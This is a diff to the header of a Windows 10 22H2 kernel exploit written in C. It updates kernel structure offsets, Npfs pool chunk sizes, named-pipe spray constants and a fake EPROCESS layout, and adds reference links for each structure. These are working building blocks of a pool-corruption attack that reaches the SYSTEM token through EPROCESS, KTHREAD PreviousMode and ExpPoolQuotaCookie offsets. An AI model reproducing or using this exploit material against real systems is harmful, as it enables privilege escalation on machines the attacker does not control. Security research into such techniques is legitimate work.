@@ -3,17 +3,26 @@
 
 #include <windows.h>
 
+// Kernel constants
 #define SYSTEM_PID 0x4
 
 // Kernel structure offsets
-#define EPROCESS_TYPE_OFFSET 0x0
-#define EPROCESS_KTHREAD_OFFSET 0x30
-#define EPROCESS_UNIQUE_PROCESS_ID_OFFSET 0x440
-#define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448
-#define EPROCESS_TOKEN_OFFSET 0x4B8
-#define EPROCESS_QUOTA_BLOCK_OFFSET 0x568
-#define KTHREAD_PREVIOUS_MODE_OFFSET 0x232
-#define KTHREAD_THREAD_LIST_ENTRY 0x2F8
+// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_EPROCESS
+#define EPROCESS_Type_OFFSET 0x0
+#define EPROCESS_ThreadListHead_OFFSET 0x30
+#define EPROCESS_UniqueProcessId_OFFSET 0x440
+#define EPROCESS_ActiveProcessLinks_OFFSET 0x448
+#define EPROCESS_Token_OFFSET 0x4B8
+#define EPROCESS_QuotaBlock_OFFSET 0x568
+// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_KTHREAD
+#define KTHREAD_PreviousMode_OFFSET 0x232
+#define KTHREAD_ThreadListEntry_OFFSET 0x2F8
+// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_FILE_OBJECT
+#define FILE_OBJECT_DeviceObject_OFFSET 0x8
+// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_DEVICE_OBJECT
+#define DEVICE_OBJECT_DriverObject_OFFSET 0x8
+// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_DRIVER_OBJECT
+#define DRIVER_OBJECT_DriverStart_OFFSET 0x18
 
 // Kernel function and variable offsets
 #define nt_PsInitialSystemProcess_OFFSET 0xCFC420
@@ -22,26 +31,30 @@
 #define nt_RtlpHpHeapGlobals_OFFSET 0xC1DD40
 #define Npfs_imp_ExAllocatePoolWithTag_OFFSET 0x7050
 
-// Pipe structure offsets
-#define ROOT_PIPE_QUEUE_ENTRY_OFFSET 0x48
-#define FILE_OBJECT_OFFSET 0x30
+// Npfs.sys structure offsets
+// ref: https://github.com/reactos/reactos/blob/c2c66af/drivers/filesystems/npfs/npfs.h#L258
+#define NP_CCB_FileObject_OFFSET 0x30
+#define NP_CCB_DataQueue_OFFSET 0x48
 
 // Pool chunk constants
-#define PIPE_QUEUE_ENTRY_BUFSIZE(block_size) (block_size - sizeof(POOL_HEADER) - sizeof(pipe_queue_entry_t))
-#define VULN_BLOCK_SIZE 0x200
-#define VICTIM_BLOCK_SIZE 0x210
-#define GHOST_BLOCK_SIZE 0x370
-#define PREV_CHUNK_OFFSET (sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER) + sizeof(pipe_queue_entry_t))
-#define NEXT_CHUNK_OFFSET ((sizeof(HEAP_VS_CHUNK_HEADER) + VICTIM_BLOCK_SIZE) * 2 - PREV_CHUNK_OFFSET)
+#define CALC_NDQE_DataSize(chunk_size) (chunk_size - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(POOL_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY))
+#define VULN_CHUNK_SIZE 0x210
+#define VICTIM_CHUNK_SIZE 0x220
+#define PREV_CHUNK_OFFSET (sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER) + sizeof(NP_DATA_QUEUE_ENTRY))
+#define NEXT_CHUNK_OFFSET (VICTIM_CHUNK_SIZE * 2 - PREV_CHUNK_OFFSET)
+#define GHOST_CHUNK_SIZE NEXT_CHUNK_OFFSET
+#define GHOST_CHUNK_MARKER_1 0xDEADBEEFC0DECAFE
+#define GHOST_CHUNK_MARKER_2 0xFACEFEEDCAFEBABE
 
 // Fake eprocess constants
 #define FAKE_EPROCESS_SIZE 0x800
 #define FAKE_EPROCESS_OFFSET 0x50
 
 // Spray constants
-#define SPRAY_SIZE 0x80 * 10
+#define NUM_PIPES_SPRAY 0x80 * 10
 
 // Kernel structures
+// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_HEAP_VS_CHUNK_HEADER
 typedef struct _HEAP_VS_CHUNK_HEADER
 {
     uint16_t MemoryCost;
@@ -54,6 +67,7 @@ typedef struct _HEAP_VS_CHUNK_HEADER
 } HEAP_VS_CHUNK_HEADER;
 static_assert(sizeof(HEAP_VS_CHUNK_HEADER) == 0x10, "HEAP_VS_CHUNK_HEADER must be 0x10 bytes");
 
+// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_POOL_HEADER
 typedef struct _POOL_HEADER
 {
     uint8_t PreviousSize;
@@ -65,31 +79,33 @@ typedef struct _POOL_HEADER
 } POOL_HEADER;
 static_assert(sizeof(POOL_HEADER) == 0x10, "POOL_HEADER must be 0x10 bytes");
 
-typedef struct pipe_queue_entry
+// ref: https://github.com/reactos/reactos/blob/c2c66af/drivers/filesystems/npfs/npfs.h#L148
+typedef struct _NP_DATA_QUEUE_ENTRY
 {
-    LIST_ENTRY list;
-    uintptr_t linkedIRP;
-    uintptr_t SecurityClientContext;
-    unsigned long isDataInKernel;
-    unsigned long remaining_bytes;
+    LIST_ENTRY QueueEntry;
+    uintptr_t Irp;
+    uintptr_t ClientSecurityContext;
+    unsigned long DataEntryType;
+    unsigned long QuotaInEntry;
     unsigned long DataSize;
-    unsigned long field_2C;
+    unsigned long unknown;
     char data[0];
-} pipe_queue_entry_t;
-static_assert(sizeof(pipe_queue_entry_t) == 0x30, "pipe_queue_entry_t must be 0x30 bytes");
+} NP_DATA_QUEUE_ENTRY;
+static_assert(sizeof(NP_DATA_QUEUE_ENTRY) == 0x30, "NP_DATA_QUEUE_ENTRY must be 0x30 bytes");
 
-typedef struct pipe_queue_entry_irp
+// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_IRP
+typedef struct _IRP
 {
-    uint64_t unknown[3];
+    uint64_t Unused[3];
     uint64_t SystemBuffer;
-} pipe_queue_entry_irp_t;
+} IRP;
 
 // Exploit structures
 typedef struct vs_chunk
 {
     uintptr_t encoded_vs_header[2];
     POOL_HEADER pool_header;
-    pipe_queue_entry_t pipe_queue_entry;
+    NP_DATA_QUEUE_ENTRY np_data_queue_entry;
 } vs_chunk_t;
 
 typedef struct pipe_pair
@@ -101,7 +117,7 @@ typedef struct pipe_pair
 typedef struct pipe_group
 {
     size_t nb;
-    size_t block_size;
+    size_t chunk_size;
     pipe_pair_t pipes[1];
 } pipe_group_t;
 
@@ -114,7 +130,7 @@ typedef struct exploit_pipes
 typedef struct exploit_addresses
 {
     uintptr_t ghost_vs_chunk;
-    uintptr_t root_pipe_queue_entry;
+    uintptr_t np_ccb_data_queue;
 
     uintptr_t kernel_base;
     uintptr_t ExpPoolQuotaCookie;
